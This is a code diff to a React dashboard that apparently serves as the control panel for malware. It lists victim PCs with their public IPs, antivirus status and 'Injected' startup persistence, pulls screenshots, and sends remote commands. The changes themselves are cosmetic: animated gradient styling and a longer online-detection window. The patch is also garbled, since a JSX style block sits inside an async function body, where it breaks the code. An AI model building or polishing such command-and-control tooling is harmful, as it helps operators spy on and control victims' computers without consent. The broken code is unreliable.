@@ -55,10 +55,39 @@ export default function Dashboard() {
     if (!lastSeen) return false;
     const last = new Date(lastSeen).getTime();
     const now = new Date().getTime();
-    return (now - last) < 60000; // En ligne si vu il y a moins de 60 secondes
+    return (now - last) < 120000; // Seuil augmenté à 2 min pour eviter les faux offline
   };
 
   const fetchScreenshots = async (pcName: string) => {
+...
+      <style dangerouslySetInnerHTML={{ __html: `
+        @keyframes gradientFlow {
+          0% { background-position: 0% 50%; }
+          50% { background-position: 100% 50%; }
+          100% { background-position: 0% 50%; }
+        }
+        .animate-gradient-red {
+          background: linear-gradient(-45deg, #ef4444, #991b1b, #dc2626, #7f1d1d);
+          background-size: 400% 400%;
+          animation: gradientFlow 3s ease infinite;
+          -webkit-background-clip: text;
+          -webkit-text-fill-color: transparent;
+        }
+        .animate-gradient-green {
+          background: linear-gradient(-45deg, #22c55e, #14532d, #16a34a, #064e3b);
+          background-size: 400% 400%;
+          animation: gradientFlow 3s ease infinite;
+          -webkit-background-clip: text;
+          -webkit-text-fill-color: transparent;
+        }
+        .animate-gradient-title {
+          background: linear-gradient(-45deg, #ffffff, #9ca3af, #f3f4f6, #4b5563);
+          background-size: 400% 400%;
+          animation: gradientFlow 5s ease infinite;
+          -webkit-background-clip: text;
+          -webkit-text-fill-color: transparent;
+        }
+      `}} />
     const { data, error } = await supabase.storage.from('kerchak-assets').list('', {
       limit: 10,
       offset: 0,
@@ -125,7 +154,7 @@ export default function Dashboard() {
               <div className="flex justify-between items-start mb-4">
                 <div>
                   <h3 className="text-xl font-bold text-white group-hover:text-red-400 transition-colors flex items-center gap-2">
-                    <Monitor size={18} /> {pc.pc_name}
+                    <Monitor size={18} /> <span className="animate-gradient-title">{pc.pc_name}</span>
                   </h3>
                   <p className="text-xs text-gray-400 mt-1">{pc.public_ip}</p>
                 </div>
@@ -136,12 +165,12 @@ export default function Dashboard() {
               <div className="grid grid-cols-2 gap-4 mb-6 text-sm">
                 <div className="bg-white/5 p-3 rounded-lg border border-white/5">
                   <span className="text-gray-500 text-xs block mb-1 flex items-center gap-1"><ShieldAlert size={12}/> Antivirus</span>
-                  <span className={pc.antivirus.includes('Defender') ? 'text-gray-200' : 'text-red-400 font-medium'}>{pc.antivirus || 'None'}</span>
+                  <span className="text-red-400 font-medium text-xs break-words animate-gradient-red">{pc.antivirus || 'None'}</span>
                 </div>
                 <div className="bg-white/5 p-3 rounded-lg border border-white/5">
                   <span className="text-gray-500 text-xs block mb-1 flex items-center gap-1"><Shield size={12}/> Startup</span>
                   <div className="flex items-center justify-between">
-                    <span className={pc.startup_enabled ? 'text-green-400 font-medium' : 'text-gray-400'}>{pc.startup_enabled ? 'Injected' : 'None'}</span>
+                    <span className={pc.startup_enabled ? 'animate-gradient-green font-bold' : 'text-gray-400'}>{pc.startup_enabled ? 'Injected' : 'None'}</span>
                     {pc.startup_enabled ? (
                       <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup_remove')} className="text-[10px] bg-red-500/20 text-red-400 px-1 rounded hover:bg-red-500/40">Remove</button>
                     ) : (
